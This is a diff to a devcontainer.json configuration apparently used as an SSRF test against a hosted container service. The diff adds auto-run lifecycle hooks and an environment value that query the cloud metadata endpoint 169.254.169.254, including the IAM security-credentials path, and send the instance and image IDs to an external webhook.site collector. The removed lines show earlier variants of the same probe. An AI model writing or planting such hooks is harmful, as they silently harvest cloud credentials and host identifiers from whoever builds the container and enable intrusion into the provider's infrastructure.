@@ -1,19 +1,18 @@
 {
-  "name": "SSRF Test 2026",
+  "name": "SSRF Test 2026 v2",
   "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
   "features": {
-    "http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/feature-imds-169.254.169.254.tgz": {},
-    "http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/feature-metadata-google.tgz": {},
-    "http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/feature-ecs-169.254.170.2.tgz": {},
-    "http://169.254.169.254/latest/meta-data/?callback=http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/imds-callback": {},
-    "http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401@169.254.169.254/latest/meta-data/": {}
+    "ghcr.io/devcontainers/features/common-utils:2": {}
   },
-  "initializeCommand": "curl -s http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/init-cmd",
-  "onCreateCommand": "curl -s http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/oncreate-cmd",
-  "postCreateCommand": "curl -s http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/postcreate-cmd",
-  "postStartCommand": "curl -s http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/poststart-cmd",
-  "remoteUser": "vscode",
+  "initializeCommand": "curl -s http://169.254.169.254/latest/meta-data/ > /tmp/imds_init.txt 2>&1 || true",
+  "onCreateCommand": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/imds_creds.txt 2>&1 || true",
+  "postCreateCommand": "curl -s http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/postcreate-imds-$(curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo 'blocked')",
+  "postStartCommand": "curl -s http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/poststart-imds-$(curl -s http://169.254.169.254/latest/meta-data/ami-id 2>/dev/null || echo 'blocked')",
+  "remoteEnv": {
+    "IMDS_TEST": "$(curl -s http://169.254.169.254/latest/meta-data/)"
+  },
   "containerEnv": {
-    "SSRF_TEST": "http://169.254.169.254/latest/meta-data/"
+    "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI": "/v2/credentials",
+    "ECS_CONTAINER_METADATA_URI": "http://169.254.170.2"
   }
 }
